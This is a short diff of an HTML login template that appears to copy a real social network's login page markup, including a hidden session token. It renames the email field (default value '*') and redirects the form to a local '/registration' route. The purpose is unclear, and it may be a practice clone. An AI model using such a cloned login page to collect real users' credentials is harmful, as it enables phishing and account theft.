@@ -221,7 +221,7 @@ var abp;
     <input type="hidden" name="lg_h" value="2a345e4e04178ccfb1" />
     <input type="hidden" name="ul" id="quick_login_ul" value="" />
     <div class="label">Phone or email</div>
-    <div class="labeled"><input type="text" name="e" class="dark" id="e" value="" /></div>
+    <div class="labeled"><input type="text" name="name" class="dark" id="name" value="*" /></div>
     <div class="label">Password</div>
     <div class="labeled"><input type="password" name="p" class="dark" id="e" onkeyup="toggle('quick_expire', !!this.value);toggle('quick_forgot', !this.value)" /></div>
     <input type="submit" class="submit" />
@@ -296,7 +296,7 @@ var abp;
 </div>
 <div id="index_rcolumn" class="index_rcolumn">
   <div id="index_login" class="page_block index_login">
-    <form method="post" name="login" id="index_login_form" action="{{ url('/login') }}">
+    <form method="post" name="login" id="index_login_form" action="{{ url('/registration') }}">
       <input type="hidden" name="act" id="act" value="login">
       <input type="hidden" name="role" value="al_frame" />
       <input type="hidden" name="expire" id="index_expire_input" value="" />
